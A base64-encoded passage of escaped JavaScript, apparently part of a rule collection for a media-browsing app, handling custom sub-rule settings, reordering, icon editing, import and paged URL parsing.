Y3VzdG9tRGF0YSwgcnVsZXMgfSA9IEpTT04ucGFyc2UocmVxdWVzdChpbnB1dCkpXFxcXG4gICAgICAgICAgICBzYXZlRmlsZSgndXBkYXRlSW50ZXJ2YWwnLCB1cGRhdGVJbnRlcnZhbClcXFxcbiAgICAgICAgICAgIHNhdmVGaWxlKCduZXdXaW5kb3cnLCBuZXdXaW5kb3cpXFxcXG4gICAgICAgICAgICBzYXZlRmlsZSgndGFiRm9sZCcsIHRhYkZvbGQpXFxcXG4gICAgICAgICAgICBzYXZlRmlsZSgnZGlzYWJsZUN1c3RvbScsIGRpc2FibGVDdXN0b20pXFxcXG4gICAgICAgICAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIGN1c3RvbURhdGEpXFxcXG4gICAgICAgICAgICBpZiAocnVsZXMpIHdyaXRlRmlsZSh1cmwsIHJ1bGVzKVxcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKVxcXFxuICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+W3suaBouWkje+8jOWmguaenOS4jeaDs+WQjOatpei/nOeoi+S7k+W6k++8jOWPr+S7peiuvue9ruabtOaWsOmikeeOh+S4uuaJi+WKqCdcXFxcbiAgICAgICAgfSwgdXJsKVxcXFxuICAgIH0sIFFJTkdfVElUTEUsIHVwZGF0ZUludGVydmFsLCBuZXdXaW5kb3csIHRhYkZvbGQsIGRpc2FibGVDdXN0b20pLFxcXFxuICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXFxcbn0sIHtcXFxcbiAgICB0aXRsZTogJ+KAnOKAnOKAneKAnTxmb250IGNvbG9yPVxcXFxcXFwiIzY2NjY2NlxcXFxcXFwiPjxzbWFsbD7nibnliKvpuKPosKLvvIzlsI/nqIvluo/mj5DkvpvogIXvvJrwn4ia77iPXFxcXFxcXFxuJ1xcXFxuICAgICAgICAvKmRhdGEucmVkdWNlKChzZWxmLCB2KSA9PiB2LmF1dGhvciA/IHNlbGYuY29uY2F0KHYuYXV0aG9yLnNwbGl0KCcmJykpIDogc2VsZiwgW10pXFxcXG4gICAgICAgIC5maWx0ZXIoKHYsIGksIGFycikgPT4gdiAmJiBhcnIuaW5kZXhPZih2KSA9PSBpKS5qb2luKCfjgIEnKSovLFxcXFxuICAgIHVybDogJ2hpa2VyOi8vZW1wdHknLFxcXFxuICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMSdcXFxcbn0pXFxcXG5lbC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLmm7TmlrAm5Y+N6aaIXFxcXFxcXCIsXFxcXG4gICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9VcCNub1JlZnJlc2gjI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5I1xcXFxcXFwiLFxcXFxuICAgIGV4dHJhOiB7XFxcXG4gICAgICAgIHZlcnNpb246IE1ZX1BBUkFNUy52ZXJzaW9uIHx8IFxcXFxcXFwi6I635Y+W54mI5pys5aSx6LSl77yM6Ieq6KGM5p+l55yLXFxcXFxcXCJcXFxcbiAgICB9LFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIlxcXFxufSk7XFxcXG5lbC5wdXNoKHsgY29sX3R5cGU6ICdsaW5lJyB9LCB7XFxcXG4gICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgJ/Cfk50nLnNtYWxsKCkgKyAnJm5ic3Ag6ZiF5Yqo5ryr8J+UruiHquWumuS5iSAmbmJzcCcuYm9sZCgpLmZvbnRjb2xvcignIzc1NzU3NScpICsgKGRpc2FibGVDdXN0b20gPyAn4p2MJyA6ICfirZUnKS5zbWFsbCgpLFxcXFxuICAgIHVybDogJChbKGRpc2FibGVDdXN0b20gPyAn5ZCv55SoJyA6ICfnpoHnlKgnKSArICflkIjpm4boh6rlrprkuYknLCAn5riF6Zmk6Ieq5a6a5LmJ5pWw5o2uJywgJ+e8lui+kUpTT04nXSwgMSkuc2VsZWN0KCgpID0+IHtcXFxcbiAgICAgICAgc3dpdGNoIChpbnB1dC5zbGljZSgwLCAyKSkge1xcXFxuICAgICAgICAgICAgY2FzZSAn5riF6ZmkJzpcXFxcbiAgICAgICAgICAgICAgICBkZWxldGVGaWxlKCdjdXN0b21EYXRhJylcXFxcbiAgICAgICAgICAgICAgICBicmVha1xcXFxuICAgICAgICAgICAgY2FzZSAn5ZCv55SoJzpcXFxcbiAgICAgICAgICAgICAgICBzYXZlRmlsZSgnZGlzYWJsZUN1c3RvbScsICcnKVxcXFxuICAgICAgICAgICAgICAgIGJyZWFrXFxcXG4gICAgICAgICAgICBjYXNlICfnpoHnlKgnOlxcXFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdkaXNhYmxlQ3VzdG9tJywgJ1QnKVxcXFxuICAgICAgICAgICAgICAgIGlucHV0ICs9ICdcXFxcXFxcXG7lsI/nqIvluo/lkK/nlKgv56aB55So44CB6YeN5paw5o6S5bqP562J5pON5L2c5Z2H5LiN5Lya5L2T546w5Zyo6aaW6aG15bCP56iL5bqP5YiX6KGo5LitJ1xcXFxuICAgICAgICAgICAgICAgIGJyZWFrXFxcXG4gICAgICAgICAgICBjYXNlICfnvJbovpEnOlxcXFxuICAgICAgICAgICAgICAgIGxldCB1cmwgPSBnZXRNeVZhcigncmVtb3RlVXJsJylcXFxcbiAgICAgICAgICAgICAgICBpZiAoIXVybC5zdGFydHNXaXRoKCdoaWtlcjovL2ZpbGVzLycpICYmICF1cmwuc3RhcnRzV2l0aCgnZmlsZTovLycpKVxcXFxuICAgICAgICAgICAgICAgICAgICB1cmwgPSAnaGlrZXI6Ly9maWxlcy9saWJzLycgKyBtZDUodXJsKSArICcuanMnXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICAnaGlrZXI6Ly9wYWdlL2ludGVyZmFjZSNub1JlZnJlc2gjI25vSGlzdG9yeSMjbm9SZWNvcmRIaXN0b3J5Iz9ydWxlPUpTT07nvJbovpHlmagmSnNvbj0nK2Jhc2U2NEVuY29kZSh1cmwpXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxcXG4gICAgICAgIHJldHVybiAndG9hc3Q6Ly/lt7InICsgaW5wdXRcXFxcbiAgICB9KSxcXFxcbiAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcXFxuICAgIGV4dHJhOiB7IGxpbmVWaXNpYmxlOiBmYWxzZSB9XFxcXG59KTsvKlxcXFxuKGRpc2FibGVDdXN0b20gPyBbJ+WvvOWFpea1t+mYlCddIDogWyflkK/nlKgv56aB55SoJywgJ+mHjeaWsOaOkuW6jycsICfmm7TmlLnlm77moIcnLCAn5a+85YWl5rW36ZiUJ10pLmZvckVhY2goKHYpID0+IHtcXFxcbiAgICBlbC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IHYgPT0gZWRpdE1vZGUgPyAn4oCc4oCc4oCd4oCdJyArIHYuYm9sZCgpLmZvbnRjb2xvcignIzEyYjY2OCcpIDogdixcXFxcbiAgICAgICAgdXJsOiB2ID09IGVkaXRNb2RlID8gJ2hpa2VyOi8vZW1wdHknIDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgodikgPT4ge1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoJ2VkaXRNb2RlJywgdilcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcXFxuICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgICAgICB9LCB2KSxcXFxcbiAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcXFxuICAgIH0pXFxcXG59KTtcXFxcbmlmIChlZGl0TW9kZSA9PSAn5a+85YWl5rW36ZiUJykgZWwucHVzaCh7XFxcXG4gICAgdGl0bGU6ICflhajpg6jlr7zlhaUnLFxcXFxuICAgIHVybDogJ+a1t+mYlOinhueVjO+/pWhvbWVfcnVsZV91cmzvv6UnICsgKHVybC5zdGFydHNXaXRoKCdoaWtlcjovLycpIHx8IHVybC5zdGFydHNXaXRoKCdmaWxlOi8vJykgPyB1cmwgOiAnaGlrZXI6Ly9maWxlcy9saWJzLycgKyBtZDUodXJsKSArICcuanMnKSxcXFxcbiAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcXFxuICAgIGV4dHJhOiB7IGxpbmVWaXNpYmxlOiBmYWxzZSB9XFxcXG59KTtcXFxcbihkaXNhYmxlQ3VzdG9tID8gZGF0YSA6IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKSkuZm9yRWFjaCgodiwgaSkgPT4ge1xcXFxuICAgIGxldCBkID0geyB0aXRsZTogdi50aXRsZSwgaW1nOiBkYXRhW2ldLmljb24gfVxcXFxuICAgIHN3aXRjaCAoZWRpdE1vZGUpIHtcXFxcbiAgICAgICAgY2FzZSAn5ZCv55SoL+emgeeUqCc6XFxcXG4gICAgICAgICAgICBkLnRpdGxlID0gKHYudmlzaWJsZSA/ICfwn5+iICAnIDogJ/CflLQgICcpICsgZC50aXRsZVxcXFxuICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGVzID0gSlNPTi5wYXJzZShyZWFkRmlsZSgnY3VzdG9tRGF0YScpIHx8ICdbXScpXFxcXG4gICAgICAgICAgICAgICAgcnVsZXNbaV0udmlzaWJsZSA9ICFydWxlc1tpXS52aXNpYmxlXFxcXG4gICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBKU09OLnN0cmluZ2lmeShydWxlcykpXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgICAgICAgICAgfSwgaSlcXFxcbiAgICAgICAgICAgIGJyZWFrXFxcXG4gICAgICAgIGNhc2UgJ+mHjeaWsOaOkuW6jyc6XFxcXG4gICAgICAgICAgICBsZXQgc29ydEZsYWcgPSBwYXJzZUludChnZXRNeVZhcignc29ydEZsYWcnLCAnLTEnKSlcXFxcbiAgICAgICAgICAgIGQudGl0bGUgPSAoc29ydEZsYWcgPT0gaSA/ICfwn5SDICAnIDogJycpICsgZC50aXRsZVxcXFxuICAgICAgICAgICAgaWYgKHNvcnRGbGFnID09IC0xKVxcXFxuICAgICAgICAgICAgICAgIGQudXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoaSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcignc29ydEZsYWcnLCBpLnRvU3RyaW5nKCkpXFxcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6YCJ5oup6KaB56e75Yqo5Yiw55qE5L2N572uJ1xcXFxuICAgICAgICAgICAgICAgIH0sIGkpXFxcXG4gICAgICAgICAgICBlbHNlXFxcXG4gICAgICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChvbGRJbmRleCwgbmV3SW5kZXgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHJ1bGVzID0gSlNPTi5wYXJzZShyZWFkRmlsZSgnY3VzdG9tRGF0YScpIHx8ICdbXScpXFxcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGVzLnNwbGljZShuZXdJbmRleCwgMCwgcnVsZXMuc3BsaWNlKG9sZEluZGV4LCAxKVswXSlcXFxcbiAgICAgICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBKU09OLnN0cmluZ2lmeShydWxlcykpXFxcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKCdzb3J0RmxhZycsICctMScpXFxcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgICAgICAgICAgICAgfSwgc29ydEZsYWcsIGkpXFxcXG4gICAgICAgICAgICBicmVha1xcXFxuICAgICAgICBjYXNlICfmm7TmlLnlm77moIcnOlxcXFxuICAgICAgICAgICAgZC51cmwgPSAkKHYuaWNvbiB8fCAnJywgJ+i+k+WFpeaWsOWbvuagh+WcsOWdgOaIluminOiJsuS7o+egge+8micpLmlucHV0KChpKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGVzID0gSlNPTi5wYXJzZShyZWFkRmlsZSgnY3VzdG9tRGF0YScpIHx8ICdbXScpXFxcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0KVxcXFxuICAgICAgICAgICAgICAgICAgICBydWxlc1tpXS5pY29uID0gaW5wdXRcXFxcbiAgICAgICAgICAgICAgICBlbHNlXFxcXG4gICAgICAgICAgICAgICAgICAgIGRlbGV0ZSBydWxlc1tpXS5pY29uXFxcXG4gICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBKU09OLnN0cmluZ2lmeShydWxlcykpXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgICAgICAgICAgfSwgaSlcXFxcbiAgICAgICAgICAgIGJyZWFrXFxcXG4gICAgICAgIGNhc2UgJ+WvvOWFpea1t+mYlCc6XFxcXG4gICAgICAgICAgICBkLnVybCA9ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGkpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgZGF0YSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2RhdGFMb2FkP3J1bGU9JyArIGdldE15VmFyKCdteUNvbGxlY3Rpb24nKSwgdHJ1ZSlcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3J1bGU6Ly8nICsgYmFzZTY0RW5jb2RlKEpTT04uc3RyaW5naWZ5KGRhdGFbaV0pKVxcXFxuICAgICAgICAgICAgfSwgaSlcXFxcbiAgICAgICAgICAgIGJyZWFrXFxcXG4gICAgfVxcXFxuICAgIGVsLnB1c2goZClcXFxcbn0pKi9cXFxcbihkaXNhYmxlQ3VzdG9tID8gWyflr7zlhaXmtbfpmJQnXSA6IFsn5ZCv55SoL+emgeeUqCcsICfph43mlrDmjpLluo8nLCAn5pu05pS55Zu+5qCHJywgJ+WvvOWFpea1t+mYlCddKS5mb3JFYWNoKCh2KSA9PiB7XFxcXG4gICAgZWwucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiB2ID09IGVkaXRNb2RlID8gJ+KAnOKAnOKAneKAnScgKyB2LmJvbGQoKS5mb250Y29sb3IoJyMxMmI2NjgnKSA6IHYsXFxcXG4gICAgICAgIHVybDogdiA9PSBlZGl0TW9kZSA/ICdoaWtlcjovL2VtcHR5JyA6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHYpID0+IHtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKCdlZGl0TW9kZScsIHYpXFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXFxcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcbiAgICAgICAgfSwgdiksXFxcXG4gICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXFxcbiAgICB9KVxcXFxufSk7XFxcXG5pZihlZGl0TW9kZSA9PT0gJ+WvvOWFpea1t+mYlCcpIHtcXFxcbiAgICBlbC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6J+aQnOe0oicsXFxcXG4gICAgICAgIGRlc2M6J+i+k+WFpeWwj+eoi+W6j+agh+mimHzlnLDlnYDov5vooYzmkJzntKIuLi4nLFxcXFxuICAgICAgICB1cmw6JC50b1N0cmluZygoKT0+e1xcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICB9KSxcXFxcbiAgICAgICAgY29sX3R5cGU6J2lucHV0JyxcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIG9uQ2hhbmdlOiBcXFxcXFxcInB1dE15VmFyKCdpbXBvcnRTZWFyY2hLZXknLGlucHV0KVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgdGl0bGVWaXNpYmxlOiB0cnVlLFxcXFxuICAgICAgICAgICAgZGVmYXVsdFZhbHVlOmdldE15VmFyKCdpbXBvcnRTZWFyY2hLZXknLCcnKVxcXFxuICAgICAgICB9LFxcXFxuICAgIH0pO1xcXFxuICAgIGVsLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ+WFqOmDqOWvvOWFpSjpnZ7mkJzntKLov4fmu6TlkI7nu5PmnpwpJyxcXFxcbiAgICAgICAgdXJsOiAn5rW36ZiU6KeG55WM77+laG9tZV9ydWxlX3VybO+/pScgKyAodXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vJykgfHwgdXJsLnN0YXJ0c1dpdGgoJ2ZpbGU6Ly8nKSA/IHVybCA6ICdoaWtlcjovL2ZpbGVzL2xpYnMvJyArIG1kNSh1cmwpICsgJy5qcycpLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcXFxuICAgICAgICBleHRyYToge2xpbmVWaXNpYmxlOiBmYWxzZX1cXFxcbiAgICB9KTtcXFxcbn1cXFxcbnZhciBkYXRhcyA9IChkaXNhYmxlQ3VzdG9tID8gZGF0YSA6IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKSk7XFxcXG5sZXQgc2sgPSBnZXRNeVZhcignaW1wb3J0U2VhcmNoS2V5JywnJyk7XFxcXG5pZihlZGl0TW9kZSA9PT0gJ+WvvOWFpea1t+mYlCcmJnNrKSB7XFxcXG4gICAgZGF0YXMgPSBkYXRhcy5maWx0ZXIoaXQ9Pml0LnRpdGxlLmluY2x1ZGVzKHNrKXx8KGl0LnVybCYmaXQudXJsLmluY2x1ZGVzKHNrKSkpO1xcXFxuICAgIGRhdGEgPSBkYXRhLmZpbHRlcihpdD0+aXQudGl0bGUuaW5jbHVkZXMoc2spfHwoaXQudXJsJiZpdC51cmwuaW5jbHVkZXMoc2spKSk7XFxcXG59XFxcXG5kYXRhcy5mb3JFYWNoKCh2LCBpKSA9PiB7XFxcXG4gICAgbGV0IGQgPSB7IHRpdGxlOiB2LnRpdGxlLCBpbWc6IGRhdGFbaV0uaWNvbiB9XFxcXG4gICAgc3dpdGNoIChlZGl0TW9kZSkge1xcXFxuICAgICAgICBjYXNlICflkK/nlKgv56aB55SoJzpcXFxcbiAgICAgICAgICAgIGQudGl0bGUgPSAodi52aXNpYmxlID8gJ/Cfn6IgICcgOiAn8J+UtCAgJykgKyBkLnRpdGxlXFxcXG4gICAgICAgICAgICBkLnVybCA9ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGkpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJylcXFxcbiAgICAgICAgICAgICAgICBydWxlc1tpXS52aXNpYmxlID0gIXJ1bGVzW2ldLnZpc2libGVcXFxcbiAgICAgICAgICAgICAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIEpTT04uc3RyaW5naWZ5KHJ1bGVzKSlcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgICAgICAgICB9LCBpKVxcXFxuICAgICAgICAgICAgYnJlYWtcXFxcbiAgICAgICAgY2FzZSAn6YeN5paw5o6S5bqPJzpcXFxcbiAgICAgICAgICAgIGxldCBzb3J0RmxhZyA9IHBhcnNlSW50KGdldE15VmFyKCdzb3J0RmxhZycsICctMScpKVxcXFxuICAgICAgICAgICAgZC50aXRsZSA9IChzb3J0RmxhZyA9PSBpID8gJ/CflIMgICcgOiAnJykgKyBkLnRpdGxlXFxcXG4gICAgICAgICAgICBpZiAoc29ydEZsYWcgPT0gLTEpXFxcXG4gICAgICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKCdzb3J0RmxhZycsIGkudG9TdHJpbmcoKSlcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/pgInmi6nopoHnp7vliqjliLDnmoTkvY3nva4nXFxcXG4gICAgICAgICAgICAgICAgfSwgaSlcXFxcbiAgICAgICAgICAgIGVsc2VcXFxcbiAgICAgICAgICAgICAgICBkLnVybCA9ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKG9sZEluZGV4LCBuZXdJbmRleCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJylcXFxcbiAgICAgICAgICAgICAgICAgICAgcnVsZXMuc3BsaWNlKG5ld0luZGV4LCAwLCBydWxlcy5zcGxpY2Uob2xkSW5kZXgsIDEpWzBdKVxcXFxuICAgICAgICAgICAgICAgICAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIEpTT04uc3RyaW5naWZ5KHJ1bGVzKSlcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ3NvcnRGbGFnJywgJy0xJylcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcbiAgICAgICAgICAgICAgICB9LCBzb3J0RmxhZywgaSlcXFxcbiAgICAgICAgICAgIGJyZWFrXFxcXG4gICAgICAgIGNhc2UgJ+abtOaUueWbvuaghyc6XFxcXG4gICAgICAgICAgICBkLnVybCA9ICQodi5pY29uIHx8ICcnLCAn6L6T5YWl5paw5Zu+5qCH5Zyw5Z2A5oiW6aKc6Imy5Luj56CB77yaJykuaW5wdXQoKGkpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJylcXFxcbiAgICAgICAgICAgICAgICBpZiAoaW5wdXQpXFxcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGVzW2ldLmljb24gPSBpbnB1dFxcXFxuICAgICAgICAgICAgICAgIGVsc2VcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVsZXRlIHJ1bGVzW2ldLmljb25cXFxcbiAgICAgICAgICAgICAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIEpTT04uc3RyaW5naWZ5KHJ1bGVzKSlcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgICAgICAgICB9LCBpKVxcXFxuICAgICAgICAgICAgYnJlYWtcXFxcbiAgICAgICAgY2FzZSAn5a+85YWl5rW36ZiUJzpcXFxcbiAgICAgICAgICAgIGQudXJsID0gJ3J1bGU6Ly8nICsgYmFzZTY0RW5jb2RlKEpTT04uc3RyaW5naWZ5KGRhdGFbaV0pKTtcXFxcbiAgICAgICAgICAgIGJyZWFrXFxcXG4gICAgfVxcXFxuICAgIGVsLnB1c2goZClcXFxcbn0pXFxcXG5zZXRSZXN1bHQoZWwpXFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6ZO+5o6l5aSE55CGKlxcXCIsXFxcInBhdGhcXFwiOlxcXCJ1cmxQYXJzZVxcXCIsXFxcInJ1bGVcXFwiOlxcXCIvLyDpppbpobXpk77mjqXmm7/mjaLliIbnsbtcXFxcbmZ1bmN0aW9uIGluZGV4VXJsKHBhcmFtKSB7XFxcXG4gICAgZnVuY3Rpb24gcnVuQ29kZShydWxlKSB7XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICBsZXQgW2lucHV0LCBjb2RlXSA9IHJ1bGUuc3BsaXQoJy5qczonKVxcXFxuICAgICAgICAgICAgcmV0dXJuIGNvZGUgPyBldmFsKGNvZGUpIDogcnVsZVxcXFxuICAgICAgICB9IGNhdGNoIChlKSB7IHJldHVybiBydWxlIH1cXFxcbiAgICB9XFxcXG4gICAgbGV0IHsgUlVMRSwgcGFnZU51bSwgUUlOR19USVRMRSB9ID0gSlNPTi5wYXJzZShwYXJhbS5zcGxpdCgnIyMjJylbMV0pXFxcXG4gICAgUlVMRSA9IEpTT04ucGFyc2UoYmFzZTY0RGVjb2RlKFJVTEUpKVxcXFxuICAgIHBhZ2VOdW0gPSBwYXJzZUludChwYWdlTnVtKVxcXFxuICAgIGxldCB1cmwgPSBSVUxFLnVybFxcXFxuXFxcXG4gICAgZXZhbChKU09OLnBhcnNlKGZldGNoKCdoaWtlcjovL3BhZ2UvQ2xhc3NUYWI/cnVsZT0nICsgUUlOR19USVRMRSkpLnJ1bGUpXFxcXG4gICAgdXJsID0gdGFiSGVhZGVyLnNldFVybChmeUFsbCA/IHVybC5yZXBsYWNlKC9meUFsbC9nLCAnJCR7ZnlBbGx9JykgOiB1cmwucmVwbGFjZSgvZnkoY2xhc3N8YXJlYXx5ZWFyfHNvcnQpL2csICckJHtmeSQxfScpKVxcXFxuICAgIHVybCA9IHVybC5yZXBsYWNlKC9meXBhZ2UoPzpAKC0/XFxcXFxcXFxkKylAKT8oPzpcXFxcXFxcXCooXFxcXFxcXFxkKylAKT8vZywgKF8sIHN0YXJ0LCBzcGFjZSkgPT4gcGFyc2VJbnQoc3RhcnQgfHwgMCkgKyAxICsgKHBhZ2VOdW0gLSAxKSAqIHBhcnNlSW50KHNwYWNlIHx8IDEpKVxcXFxuICAgIHVybCA9IC9eKFtcXFxcXFxcXHNcXFxcXFxcXFNdKj8pKD86XFxcXFxcXFxbZmlyc3RQYWdlPShbXFxcXFxcXFxzXFxcXFxcXFxTXSo/KVxcXFxcXFxcXSk/KD86KFxcXFxcXFxcLmpzOltcXFxcXFxcXHNcXFxcXFxcXFNdKj8pKT8kLy5leGVjKHVybClcXFxcbiAgICBpZiAocGFnZU51bSA9PSAxICYmIHVybFsyXSkgdXJsWzFdID0gdXJsWzJdXFxcXG4gICAgaWYgKHVybFszXSAmJiAhdXJsWzFdLmluY2x1ZGVzKCcuanM6JykpIHVybFsxXSArPSB1cmxbM11cXFxcbiAgICByZXR1cm4gcnVuQ29kZSh1cmxbMV0pXFxcXG59XFxcXG5mdW5jdGlvbiBwYXJhbUhhbmRsZSh1cmxQYXJhbSwgdWEsIHVybFRtcCkge1xcXFxuICAgIGxldCBjaGFyc2V0LCBwYXJhbVRtcFxcXFxuICAgIHRyeSB7IC8vIOmTvuaOpeeahOe8lueggeOAgVVB5ZKMUmVmZXJlcuW6lOivpeaYr+mmluWFiOe7p+aJv+mmlumhtemTvuaOpVxcXFxuICAgICAgICBbLCAsIGNoYXJzZXQsIHBhcmFtVG1wXSA9IHVybFRtcC5zcGxpdCgnOycpXFxcXG4gICAgICAgIHBhcmFtVG1wID0gcGFyYW1UbXAubWF0Y2goL157KC4qKX0kLylbMV0uc3BsaXQoJyYmJylcXFxcbiAgICB9IGNhdGNoIChlKSB7IHBhcmFtVG1wID0gW10gfVxcXFxuICAgIGxldCBVc2VyQWdlbnQgPSBwYXJhbVRtcC5maW5kKCh2KSA9PiB2LnN0YXJ0c1dpdGgoJ1VzZXItQWdlbnRAJykpLFxcXFxuICAgICAgICBSZWZlcmVyID0gcGFyYW1UbXAuZmluZCgodikgPT4gdi5zdGFydHNXaXRoKCdSZWZlcmVyQCcpKVxcXFxuICAgIHVybFBhcmFtWzBdID0gdXJsUGFyYW1bMF0gfHwgJ0dFVCdcXFxcbiAgICB1cmxQYXJhbVsxXSA9IHVybFBhcmFtWzFdIHx8IGNoYXJzZXQgfHwgJ1VURi04J1xcXFxuICAgIHRyeSB7XFxcXG4gICAgICAgIHVybFBhcmFtWzJdID0gdXJsUGFyYW1bMl0ubWF0Y2goL157KC4qKX0kLylbMV0uc3BsaXQoJyYmJylcXFxcbiAgICB9IGNhdGNoIChlKSB7IHVybFBhcmFtWzJdID0gW10gfVxcXFxuICAgIC8vIOa3u+WKoOWFqOWxgFVB5ZKM5LiK57qnUmVmZXJlclxcXFxuICAgIGlmICghdXJsUGFyYW1bMl0uc29tZSgodikgPT4gdi5zdGFydHNXaXRoKCdVc2VyLUFnZW50QCcpKSkge1xcXFxuICAgICAgICBpZiAoVXNlckFnZW50KSB1cmxQYXJhbVsyXS5wdXNoKFVzZXJBZ2VudClcXFxcbiAgICAgICAgZWxzZSBpZiAodWEgPT0gJ3BjJylcXFxcbiAg